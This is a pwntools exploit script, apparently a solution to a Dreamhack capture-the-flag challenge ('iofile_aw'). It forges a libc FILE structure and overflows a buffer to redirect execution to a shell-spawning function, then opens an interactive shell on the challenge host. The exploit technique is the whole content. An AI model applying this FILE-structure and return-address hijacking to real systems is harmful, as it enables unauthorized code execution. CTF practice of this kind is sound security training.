#!/usr/bin/env python3

from pwn import *

exe = ELF("./iofile_aw_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main", env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214", env={'SHELL': '/bin/bash'})
    else:
        r = remote("host8.dreamhack.games", 8733)

    return r

def read_cmd (p, cmd):
    p.sendafter (b'# ', cmd)

def read_str (p, data):
    read_cmd (p, b'read' + b'\x00' * (512 - 4))
    # sleep (1)
    p.sendline (data)

def cp (p, data):
    read_cmd (p, b'printf ' + data)

def main():
    p = conn()
    sz_addr = 0x602010
    buff_addr = 0x602040
    get_sh = 0x4009FA
    # flag = 0xfbad0000
    # flag = 0xfbad2887
    flag = 0xfbad008b

    payload = p64 (flag) + p64 (0x4141414141414141 + 0x10) + p64 (0x4141414141414141) + p64 (0x4141414141414141) * 4  + p64 (sz_addr) + p64 (sz_addr + 0x10)
    # payload = p64 (0x4141414141414141)
    cp (p, payload)

    read_cmd (p, b'\x00' * 24)
    
    read_str (p, b'abcd')

    payload = b'A' * 0x220 + p64 (0) + p64 (get_sh)
    read_cmd (p, payload)
    read_cmd (p, b'exit' + b'\x00' * (512 - 4))


    p.interactive()


if __name__ == "__main__":
    main()
